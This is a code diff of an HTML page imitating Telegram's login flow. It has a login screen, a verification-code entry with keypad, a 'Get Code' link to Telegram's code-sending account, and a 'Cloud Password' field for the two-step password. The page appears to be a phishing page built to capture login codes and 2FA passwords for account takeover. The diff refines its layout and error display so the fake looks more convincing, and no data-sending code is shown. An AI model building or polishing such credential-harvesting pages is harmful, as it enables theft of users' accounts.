@@ -33,19 +33,19 @@
         position: fixed;
     }
 
-    .step { display: none; width: 100%; max-width: 400px; flex-direction: column; align-items: center; padding: 40px 25px; text-align: center; height: 100%; }
+    .step { display: none; width: 100%; max-width: 400px; flex-direction: column; align-items: center; padding: 30px 25px; text-align: center; height: 100%; position: relative; }
     .active { display: flex; animation: fadeIn 0.3s ease; }
 
     @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-    .tg-logo-container { margin-top: 15vh; position: relative; }
-    .tg-logo { width: 110px; height: 110px; animation: pulse 2s infinite ease-in-out; }
+    .tg-logo-container { margin-top: 10vh; position: relative; }
+    .tg-logo { width: 100px; height: 100px; animation: pulse 2s infinite ease-in-out; }
     @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
 
-    .monkey-img { width: 100px; height: 100px; margin-bottom: 20px; border-radius: 50%; }
+    .monkey-img { width: 90px; height: 90px; margin-bottom: 15px; border-radius: 50%; }
     
-    h2 { font-size: 24px; font-weight: 700; margin: 10px 0; letter-spacing: -0.5px; }
-    p { font-size: 15px; color: var(--tg-hint); line-height: 1.5; margin-bottom: 20px; padding: 0 10px; }
+    h2 { font-size: 22px; font-weight: 700; margin: 10px 0; letter-spacing: -0.5px; }
+    p { font-size: 14px; color: var(--tg-hint); line-height: 1.4; margin-bottom: 15px; padding: 0 10px; }
 
     .btn-main {
         background: var(--tg-blue); 
@@ -56,104 +56,64 @@
     }
     .btn-main:active { transform: scale(0.98); }
 
+    /* ERROR MSG CONTAINER: fixed height so it doesn't push elements down */
+    .msg-wrap { height: 45px; width: 100%; position: relative; margin: 5px 0; }
+    .msg { 
+        position: absolute; left: 0; right: 0; top: 0;
+        padding: 10px; border-radius: 10px; font-size: 13px; display: none; width: 100%; 
+        z-index: 5;
+    }
+    .error { background: #fde8e8; color: #c81e1e; font-weight: 500; border: 1px solid rgba(200, 30, 30, 0.1); }
+    .loading-msg { background: #e1effe; color: #1e429f; }
+
     .btn-getcode-box {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 8px;
-        width: 100%;
-        padding: 14px;
-        margin-top: 15px;
-        background: var(--tg-light-blue);
-        color: var(--tg-blue);
-        border: 1.5px solid rgba(36, 161, 222, 0.2);
-        border-radius: 12px;
-        font-weight: 700;
-        text-decoration: none;
-        font-size: 15px;
-        transition: 0.2s;
-    }
-    .btn-getcode-box:active { background: #e1effe; transform: translateY(1px); }
-
-    /* Input Styling for Step 3 */
-    .input-wrapper {
-        position: relative;
-        width: 100%;
-        margin-bottom: 15px;
+        display: flex; align-items: center; justify-content: center;
+        gap: 8px; width: 100%; padding: 12px; margin-top: 10px;
+        background: var(--tg-light-blue); color: var(--tg-blue);
+        border: 1.5px solid rgba(36, 161, 222, 0.3); border-radius: 12px;
+        font-weight: 700; text-decoration: none; font-size: 14px; transition: 0.2s;
     }
 
+    .input-wrapper { position: relative; width: 100%; margin-bottom: 15px; }
     .input-wrapper input {
-        width: 100%;
-        padding: 16px 45px 16px 16px;
-        border: 2.5px solid #eee;
-        border-radius: 12px;
-        font-size: 18px;
-        outline: none;
-        transition: border-color 0.2s;
+        width: 100%; padding: 16px 45px 16px 16px; border: 2.5px solid #eee;
+        border-radius: 12px; font-size: 18px; outline: none; transition: border-color 0.2s;
     }
-
-    .input-wrapper input:focus {
-        border-color: var(--tg-blue);
-    }
-
-    .input-wrapper i {
-        position: absolute;
-        right: 15px;
-        top: 50%;
-        transform: translateY(-50%);
-        color: #bbb;
-        cursor: pointer;
-        font-size: 20px;
-    }
+    .input-wrapper input:focus { border-color: var(--tg-blue); }
+    .input-wrapper i { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: #bbb; cursor: pointer; font-size: 20px; }
 
     /* OTP Styles */
-    .otp-container { display: flex; gap: 10px; margin: 25px 0; justify-content: center; }
+    .otp-container { display: flex; gap: 8px; margin: 15px 0; justify-content: center; }
     .otp-box { 
-        width: 48px; height: 58px; 
-        border: 2px solid #e0e0e0;
-        border-radius: 12px;
+        width: 44px; height: 54px; border: 2px solid #e0e0e0; border-radius: 10px;
         display: flex; align-items: center; justify-content: center; 
-        font-size: 26px; font-weight: 700;
-        background: #fdfdfd;
-        transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+        font-size: 24px; font-weight: 700; background: #fdfdfd; transition: all 0.2s;
     }
     .otp-box.filled { border-color: var(--tg-blue); background: #fff; box-shadow: 0 0 8px rgba(36, 161, 222, 0.1); }
     .otp-box.invalid { border-color: var(--error-red); background: #fff1f0; animation: shake 0.3s; }
 
     @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
 
+    /* Keypad FIXED at bottom: ensures 0 and Delete are never hidden */
     .keypad { 
-        display: grid; 
-        grid-template-columns: repeat(3, 1fr); 
-        gap: 12px;
-        width: 100%; 
-        padding: 20px;
-        background: #f4f4f7; 
-        margin-top: auto;
-        border-top-left-radius: 25px;
-        border-top-right-radius: 25px;
+        display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px;
+        width: 100%; padding: 15px 20px 25px 20px;
+        background: #f4f4f7; border-top-left-radius: 25px; border-top-right-radius: 25px;
+        position: fixed; bottom: 0; left: 0; right: 0;
+        z-index: 100;
         box-shadow: 0 -5px 15px rgba(0,0,0,0.03);
     }
     .key { 
-        background: #fff; 
-        padding: 18px; 
-        font-size: 26px; 
-        cursor: pointer; 
-        font-weight: 600;
-        border-radius: 14px;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        background: #fff; padding: 15px; font-size: 24px; cursor: pointer; 
+        font-weight: 600; border-radius: 12px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);
         display: flex; justify-content: center; align-items: center;
     }
     .key:active { background: #e0e0e0; transform: scale(0.95); }
 
-    .msg { padding: 12px; border-radius: 10px; font-size: 14px; margin: 10px 0; display: none; width: 100%; }
-    .error { background: #fde8e8; color: #c81e1e; font-weight: 500; }
-    .loading-msg { background: #e1effe; color: #1e429f; }
-
     .loader-ring {
         width: 32px; height: 32px; border: 3px solid #f3f3f3;
         border-top: 3px solid var(--tg-blue); border-radius: 50%;
-        animation: spin 0.8s linear infinite; margin: 20px auto;
+        animation: spin 0.8s linear infinite; margin: 15px auto;
     }
     @keyframes spin { 100% { transform: rotate(360deg); } }
 </style>
@@ -173,7 +133,8 @@
         <h2>Telegram Login</h2>
         <p>Please log in to receive your verification code and sync your account.</p>
         
-        <div id="status1" class="msg"></div>
+        <div class="msg-wrap"><div id="status1" class="msg"></div></div>
+
         <button class="btn-main" id="loginBtn" onclick="handleLoginClick()">
             <div class="btn-spinner" id="loginSpinner"></div>
             <span id="loginText">Log In with Telegram</span>
@@ -193,7 +154,7 @@
             <div class="otp-box" id="b4"></div>
         </div>
 
-        <div id="status2" class="msg"></div>
+        <div class="msg-wrap"><div id="status2" class="msg"></div></div>
 
         <a href="https://t.me/42777" target="_blank" class="btn-getcode-box">
             <i class="fa-solid fa-shield-halved"></i> Get Code
@@ -220,7 +181,8 @@
         <h2>Cloud Password</h2>
         <p>Your account is protected with a Two-Step Verification password.</p>
         
-        <div id="status3" class="msg"></div>
+        <div class="msg-wrap"><div id="status3" class="msg"></div></div>
+
         <div class="input-wrapper">
             <input type="password" id="2fa_input" placeholder="Password" oninput="hideMsg(3)">
             <i class="fa-solid fa-eye" id="toggleIcon" onclick="togglePasswordVisibility()"></i>
